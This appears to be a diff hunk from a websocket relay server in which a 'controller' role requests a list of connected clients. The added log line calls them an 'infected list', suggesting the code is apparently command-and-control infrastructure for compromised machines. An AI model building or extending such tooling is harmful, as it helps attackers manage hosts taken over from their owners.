@@ -101,6 +101,7 @@ async def relay_messages(websocket, client_id, role):
                     logger.info("Response relayed to origin.", extra={"origin_id": origin_id, "msg": msg})
 
             elif data.get("type") == "request_client_list" and role == "controller":
+                logger.info("Received request of infected list", extra={"origin_id": origin_id, "msg": msg})
                 # Prepare a list of clients for the controller
                 clients_list = {
                     client_id: {
